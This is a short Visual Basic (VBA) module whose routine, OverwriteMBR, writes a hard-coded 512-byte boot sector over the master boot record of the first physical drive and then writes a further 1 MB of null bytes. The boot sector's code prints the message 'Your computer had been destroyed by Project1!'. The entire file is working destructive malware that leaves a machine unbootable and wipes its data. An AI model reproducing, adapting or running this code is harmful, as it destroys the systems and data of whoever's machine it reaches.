Attribute VB_Name = "MBR"
Private Declare Function CreateFile Lib "kernel32" Alias "CreateFileA" (ByVal lpFileName As String, ByVal dwDesiredAccess As Long, ByVal dwShareMode As Long, ByVal lpSecurityAttributes As Long, ByVal dwCreationDisposition As Long, ByVal dwFlagsAndAttributes As Long, ByVal hTemplateFile As Long) As Long
Private Declare Function WriteFile Lib "kernel32" (ByVal hFile As Long, lpBuffer As Any, ByVal nNumberOfBytesToWrite As Long, lpNumberOfBytesWritten As Long, ByVal lpOverlapped As Any) As Long
Private Declare Function CloseHandle Lib "kernel32" (ByVal hObject As Long) As Long

Public Const GENERIC_READ = &H80000000
Public Const GENERIC_WRITE = &H40000000
Public Const GENERIC_EXECUTE = &H20000000
Public Const GENERIC_ALL = &H10000000
Public Const FILE_SHARE_READ = &H1
Public Const FILE_SHARE_WRITE = &H2
Public Const CREATE_NEW = 1
Public Const CREATE_ALWAYS = 2
Public Const OPEN_EXISTING = 3
Public Const OPEN_ALWAYS = 4
Public Const TRUNCATE_EXISTING = 5
Sub OverwriteMBR()
    Dim hFile As Long
    Dim buffer2() As String
    Dim buffer(511) As Byte
    Dim value As Integer
    string1 = "E9 00 00 B4 0E B0 59 CD 10 F4 B0 6F CD 10 F4 B0 75 CD 10 F4 B0 72 CD 10 F4 B0 20 CD 10 F4 B0 63 CD 10 F4 B0 6F CD 10 F4 B0 6D CD 10 F4 B0 70 CD 10 F4 B0 75 " & _
            "CD 10 F4 B0 74 CD 10 F4 B0 65 CD 10 F4 B0 72 CD 10 F4 B0 20 CD 10 F4 B0 68 CD 10 F4 B0 61 CD 10 F4 B0 64 CD 10 F4 B0 20 CD 10 F4 B0 62 CD 10 F4 B0 65 CD 10 " & _
            "F4 B0 65 CD 10 F4 B0 6E CD 10 F4 B0 20 CD 10 F4 B0 64 CD 10 F4 B0 65 CD 10 F4 B0 73 CD 10 F4 B0 74 CD 10 F4 B0 72 CD 10 F4 B0 6F CD 10 F4 B0 79 CD 10 F4 B0 " & _
            "65 CD 10 F4 B0 64 CD 10 F4 B0 20 CD 10 F4 B0 62 CD 10 F4 B0 79 CD 10 F4 B0 20 CD 10 F4 B0 50 CD 10 F4 B0 72 CD 10 F4 B0 6F CD 10 F4 B0 6A CD 10 F4 B0 65 CD " & _
            "10 F4 B0 63 CD 10 F4 B0 74 CD 10 F4 B0 31 CD 10 F4 B0 21 CD 10 F4 B0 20 CD 10 F4 E9 00 00 B4 06 B0 00 FE C7 B5 00 B1 00 B6 19 B2 50 CD 10 E9 ED FF 50 52 B9 " & _
            "07 00 BA 40 42 B8 86 00 CD 15 5A 58 C3 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 " & _
            "00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 " & _
            "00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 " & _
            "00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 " & _
            "00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 55 AA"
    buffer2 = Split(string1, " ")
    For i = 0 To 511
        value = Val("&H" & buffer2(i))
        buffer(i) = value
    Next
	hFile = CreateFile("\\.\PhysicalDrive0", GENERIC_ALL, FILE_SHARE_READ Or FILE_SHARE_WRITE, ByVal 0&, OPEN_EXISTING, ByVal 0&, ByVal 0&)
	If hFile = &HFFFFFFFF Then RaiseError
	WriteFile hFile, buffer(0), UBound(buffer) + 1, bytesWritten, ByVal 0&
	If bytesWritten < UBound(buffer) + 1 Then RaiseError
	WriteFile hFile, String(1048576, vbNullChar), 1048576, bytesWritten, ByVal 0&
	If bytesWritten < 1048576 Then RaiseError
    CloseHandle hFile
End Sub
